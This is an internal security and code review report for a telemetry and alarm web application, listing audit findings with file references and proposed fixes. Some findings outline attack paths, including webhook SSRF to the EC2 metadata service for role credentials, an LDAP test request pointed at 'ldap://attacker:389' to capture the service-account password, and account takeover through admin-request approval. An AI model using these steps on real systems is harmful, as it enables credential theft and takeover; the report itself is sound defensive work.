# Application review — 2026-10-12

Branch `data-layer` at `909783c` (deployed to AWS as `3e4149d`; the difference is
`deploy-to-aws.bat` only). Seven read-only reviewers, one per area, each told to
skip what the 2026-10-03 audit fixed. Typecheck (`shared`, `api` incl. scripts,
`web`) exits 0. No test suite was run (one shared test DB).

**Verdicts.** CONFIRMED = traced end to end by the reviewer. Items marked ✔ were
re-checked against the code by the lead before this file was written. PLAUSIBLE =
likely, not fully traced. Nothing below has been fixed yet.

## Do first

| # | Sev | Area | Finding |
|---|---|---|---|
| 1 | HIGH ✔ | Floorplans | **The draw scripts drop room limits.** `draw-architectural-floor.ts:149-169, 211-245` and `draw-qc-layout-2.ts:85-101` delete and recreate rooms carrying label / grade / meta by code but NOT `tempMin/tempMax/rhMin/rhMax`. Room limits are the in-spec band for any instrument without its own limit attributes (`telemetry-overview.ts:508-514`). **The five AWS `--apply` runs owed since 10-07 must wait for this fix.** Also: each room is its own transaction, so a mid-run error leaves a half-drawn plan. |
| 2 | HIGH ✔ | Alarms | **Webhook SSRF to the EC2 metadata service.** `alarm-webhooks/validation.ts:66-75` checks the scheme only; PUT/GET and arbitrary headers are allowed, and the test-fire returns 1000 chars of the response. An `ALARM_RULE_MANAGE` holder can read `169.254.169.254` (IMDSv2 token via PUT, then the role credentials). Block link-local / loopback after DNS resolution. |
| 3 | HIGH ✔ | Alarms | **Cron and on-ingest alarm passes overlap and can clear a live alarm on a stale reading.** The cron's `max=1` (`packages/queue/crontab.txt:62`) is graphile's maxAttempts, not a concurrency limit; the ingest job's `jobKey` only de-duplicates queued ingest jobs. A pass that read the overview before a new excursion can load the open set after it, see the new alarm, and clear it against the old value — a false "returned to spec" record, email and hooter-off. Fix: one serial `queueName` for both enqueues. |
| 4 | HIGH | Auth | **Approving an admin request bypasses every `USER_*` permission and re-auth.** `admin-requests/routes.ts:194-198` checks `ADMIN_REQUEST_APPROVE` only, then `admin-request.service.ts:270/324/345/381` call `userService.create/unlock/resetPassword/update/disable` directly. A role with just that permission can file a public FORGOT_PASSWORD for a peer, approve it, receive `temporaryPassword`, and log in as them. |
| 5 | HIGH | Auth | **LDAP test-connection sends the stored bind password to any host.** `ldap/routes.ts:70-81` + `ldap.service.ts:214-224` merge the body over the stored config; `{serverUrl:"ldap://attacker:389"}` gets a cleartext bind with the AD service-account password. `CONFIG_UPDATE` only, no re-auth, no audit. |
| 6 | HIGH ✔ | Web | **Notification Rules page never lists saved rules.** `config/notification-rules/index.tsx:197` reads a bare array; the server returns `{data, total}` (`notification-rules/routes.ts:79`). Rules can't be seen, edited or deleted; re-creating one gives duplicate notifications. |
| 7 | HIGH | Web | **Attribute Fill/Add and New Instrument's attributes skip re-auth.** `instruments/attributes-panel.tsx:215, 236` and `instruments/create.tsx:177` post with no password; when the role's Attribute Access has `requireReauth`, every call is a 401 with no dialog. `add` on an existing key also sends no reason. |
| 8 | HIGH | Reports | **A report approval can exist with no audit row.** `report-reviews/service.ts:520-539` (`decide`) and `:431/:452` (`submit`) commit, then audit outside the transaction. A missing REQUESTED row also makes `attestedSnapshotHash` fall back to the editable column (defeats DATA-7). |
| 9 | HIGH ✔ (decision) | Ingest | **A device can overwrite stored history.** `telemetry.repository.ts:126-133` is `ON CONFLICT … DO UPDATE` ("last arrival wins", deliberate, INGEST-14). Any valid token re-sending an old `ts` silently rewrites a reading already shown, alarmed on and reported; telemetry is unaudited. A QoS1 redelivery after an offset change rewrites the row with the new offset. Needs an operator decision: DO NOTHING (first wins) or audit the rewrite. |
| 10 | HIGH | Packaging | **The Linux `.deb` has never built.** All 7 `build-deb` runs on T-RH and 97 on TRH_GGP failed at `tsc` (Prisma types missing): `scripts/linux/build-deb.sh:70-72` runs `npm ci` then `tsc` with no `prisma generate` first. |

## Security / §11 — MEDIUM

- **Auth** — password reset/unlock silently re-enables a DISABLED account (`user.repository.ts:226/257/295` write `status:'ENABLED'`; `forgotPassword` accepts disabled users).
- **Auth** — `PUT /api/users/:id` accepts `status` with only `USER_UPDATE`, skipping `USER_ENABLE_DISABLE`, its re-auth and the required reason (`users/routes.ts:288-303`).
- **Auth** — role DELETE has no `isSystem` or hierarchy guard (`role.service.ts:319-353`).
- **Auth** — instrument-scope and attribute-access writes have no own-role / hierarchy check: a restricted ADMIN can set its own scope to ALL (`roles/routes.ts:591-640, 725+, 806+`).
- **Auth** — LDAP `roleMappings` writable by any `CONFIG_UPDATE` holder without a privilege check: map your own AD group to ADMIN (`ldap/routes.ts:36-66`).
- **Auth** (PLAUSIBLE) — SUPER_ADMIN is level 6 but custom roles may be 7–10; such a role can create/reset SUPER_ADMIN (`default-roles.ts:16`, `role.service.ts:65`).
- **Alarms** — notifications ignore instrument scope and `ALARM_READ` (`notification-dispatcher.ts:242-297`): a Block-A role gets every Block-B excursion.
- **Alarms** — secrets in plaintext: webhook `headers` to `ALARM_RULE_READ` (`alarm-webhooks/routes.ts:110`); SMS `httpGatewayHeaders` / URL keys to `CONFIG_READ` (`notification-settings` `routes.ts:426-428`).
- **Alarms** — webhook scope / fire-flag changes not in the audit before/after (`alarm-webhooks/routes.ts:357-366, 435-444`).
- **Alarms** — limit pass has no `isActive` / staleness gate: a decommissioned instrument's 3-day-old reading raises or clears on a limit change (`alarm-evaluation.worker.ts:185-427`).
- **Alarms** — email/SMS retries are `setTimeout`s and lost on restart (every deploy); nothing reads `RETRYING` (`delivery.service.ts:90-150`, `notification-dispatcher.ts:170-197`).
- **Alarms** — rule cooldown keyed per rule across the fleet and set before send: instrument B's alarm a minute after A's is dropped, and so is ALARM_CLEARED (`notification-dispatcher.ts:19, 98-113`).
- **Audit** — config writes and backup restore audit outside their transaction (`config/dynamic-routes.ts:116/133`, `backup.service.ts:642/645`).
- **Audit** — restore's chain check is weaker than verify-chain (no keyed-era, gap or redaction attestation): a downgraded/forged archive installs without `force` and TRUNCATEs the real trail (`backup.repository.ts:396-463`).
- **Audit** — redacted rows carry no tamper evidence outside the payload (`hash-chain.ts:296-298`); compare against the meta row's HMAC-covered `beforeValue`.
- **Audit** — rolled-back audit inserts leave BIGSERIAL gaps that verify-chain reports as "interior row deletion" (e.g. `session-sweep.ts:67-84`). May explain the local chain's 10 old anomalies (not verified).
- **Audit** — with hard delete enabled (code default; AWS until the flag is set), an `AUDIT_DELETE` holder can delete a row and then its own meta row (`audit/routes.ts:611-764`).
- **Ingest** — revocation (deactivate / new token / delete) does not reach open WS/TCP connections; MQTT has no EMQX kick on token change (`ws-listener.ts:305-325`, `tcp-listener.ts:224-254`).
- **Ingest** — profile key-removal cascade skips the attribute re-auth the direct delete forces (`instrument-profiles/routes.ts:443-447`); profile create/update/delete audit outside the transaction (`:327-342, 506-539, 610-619`).
- **Ingest** — an all-null payload (`{"t":null}`) stamps last-seen: a dead probe never goes INACTIVE and the stale value keeps being judged (`ingest-core.ts:258-271`).
- **Ingest** — one block with a past `ts` outside every partition fails the whole multi-child batch; good children's readings are lost (`ingest-core.ts:84-97`).
- **Floorplans** — functional-location instrument panel sends a scoped list as the whole membership: unlinking A also unlinks out-of-scope C and D, and drops them from webhook targets (`functional-locations/instrument-panel.tsx:69-92` vs `PUT /:id/instruments`). Also no re-auth there.
- **Floorplans** — doors/openings move to the wrong wall after inserting/deleting a corner or merging (`layout-designer/canvas.tsx:269-275`, `index.tsx` `deleteSelection` / `mergePieces`).
- **Floorplans** — `annotations` lost updates: no version check server-side; client keeps a cancelled/refused edit in `latestAnnotations` and re-sends it under the next signature (`layout-designer/index.tsx:143-147`).
- **Floorplans** — dashboard floor hidden from roles without `CONFIG_READ` (`floorplans/routes.ts:221`), shown as "No floor layout yet".
- **Floorplans** — room / plan deletes cascade links with no `FLOORPLAN_LINK_DELETED` row (`floorplans/routes.ts:379-410, 589-625`).
- **Web** — trend page From/To inputs off by the UTC offset (5h30 in IST) (`instruments/trend.tsx:384-385, 836, 846`).
- **Web** — Roles page Sidebar / Attribute Access / Panel Access tabs save without re-auth → fail when it's on (`roles-components/*-tab.tsx`).
- **Web** — Alarm Webhooks password box accepts any text when `MANAGE_ALARM_WEBHOOK` is off (looks signed, isn't).
- **Web** — Settings Save after a partial failure re-writes saved keys, producing before==after §11 rows (`settings/index.tsx:247, 268-310`).
- **Web** (PLAUSIBLE) — Settings / Data Report / trend PDF read `/api/functional-locations` (needs `FUNCTIONAL_LOCATION_READ`) on `INSTRUMENT_READ` pages → empty pickers, blank Block/Area in the PDF.
- **Web** (PLAUSIBLE) — users pages read the `CONFIG_READ`-only password policy; without it, generated passwords fail the real policy.
- **Deploy** — a failed `tsc` on AWS leaves the old API running on the NEW schema with the NEW web bundle (`deploy-on-ubuntu.sh:128-138`), not the clean rollback the bat promises.

## Dependencies (`npm audit --omit=dev`: 1 critical, 17 high, 6 moderate)
Runtime-relevant: **fastify 5.10.0** (needs ≥5.12.4; validation bypass, `X-Forwarded-*` spoofing with `TRUST_PROXY`), **adm-zip 0.5.16** (backup restore: 4 GB allocation / symlink overwrite), **sanitize-html 2.17.6** (SVG SMIL XSS bypass behind `lib/sanitize.ts`), **nodemailer 9.0.3**. The rest is build tooling. Most are non-major `npm audit fix`.

## LOW (abridged)
Login reveals account state before the password check (`auth.service.ts:133-157`) and SEC-8 still open · public CREATE_USER request may ask for SUPER_ADMIN · `GET /api/users/:id` ignores hidden roles · `/auth/me` ignores `isActive` on the role · role-config save can strip permissions from higher roles · LDAP test on a saved config sends `********` · cancelling re-auth shown as an error on 3 pages · Reports page re-derives `mayDecide` client-side (project-rule violation; server should send `canDecide`) · ACKNOWLEDGED webhook `ruleName` wrong · mixed UTC/IST in the clear email · SMS fetch has no timeout · acknowledge + audit not one transaction · partition-maintenance no retry · MKT `exp()` underflow on near-absolute-zero readings · dynamic config `min/max` never enforced server-side and SUPER_ADMIN defs can never require re-auth · bulk CSV skips attribute-access · gateway target unscoped · dashboards module (parked) misc · `deploy-to-aws.bat` says `aws login` (laptop uses `cli-laptop` keys).

## Pending / housekeeping
- **AWS owed:** verify-chain; `AUDIT_HARD_DELETE_ENABLED=false` in `/etc/digilog/digilog.env`; the two offset profile keys; the five draw scripts **after finding 1 is fixed**.
- `tasks/todo.md:96`: the gitlink and the installer flag are done; the remaining question (instrument WRITE routes unscoped?) is answered: they ARE scoped since API-9, except the gateway target, profile create and profile DELETE.
- 10-03 audit still open: SEC-8 (LOW), DATA-8 (hard-delete default, MEDIUM).
- `apps/web/CLAUDE.md` is 137.6k of the 150k load limit.
- Root `CLAUDE.md` stale prose: the Repository section says the server and `provision-ubuntu.sh` still point at TRH_GGP (both moved to T-RH); the `.deb` "smoke-installed on the runner" claim never happened; `lib/connectivity.ts probeServer` was deleted in `a92ca5d` (the `/api/health` route itself is still required). `lib/server-contact.ts` is write-only.
- Large tracked binaries (~25 MB of pptx/docx/pdf/png under `Layouts/`, `PROJECT_HANDOVER/`) are in every clone, including the server's.
- All 8 live counts in CLAUDE.md System Stats match the code.
